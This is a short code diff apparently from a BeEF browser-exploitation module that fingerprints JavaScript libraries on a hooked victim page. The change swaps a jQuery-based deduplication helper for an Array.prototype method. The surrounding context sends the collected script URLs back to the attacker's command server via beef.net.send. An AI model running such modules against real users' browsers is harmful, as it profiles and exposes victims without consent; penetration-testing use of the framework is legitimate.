@@ -11,12 +11,12 @@ beef.execute(function() {
      var results = [];
      var urls = "";  
 
-    function unique(array) {
-      return $.grep(array, function(el, index) {
-        return index === $.inArray(el, array);
-      });
-    }
-
+     Array.prototype.unique = function() {
+         var o = {}, i, l = this.length, r = [];
+         for(i=0; i<l;i+=1) o[this[i]] = this[i];
+         for(i in o) r.push(o[i]);
+         return r;
+     };
      // Fingerprints of javascript /ajax libraries . Library Name: Array of common file names 
      
      var fingerprints = {
@@ -69,7 +69,7 @@ beef.execute(function() {
                 }
             }
             if(results.length >0){
-                urls=unique(results).join('||');
+                urls=results.unique().join('||');
                 beef.net.send("<%= @command_url %>", <%=  @command_id %>, "script_urls="+urls);
             }
             else{
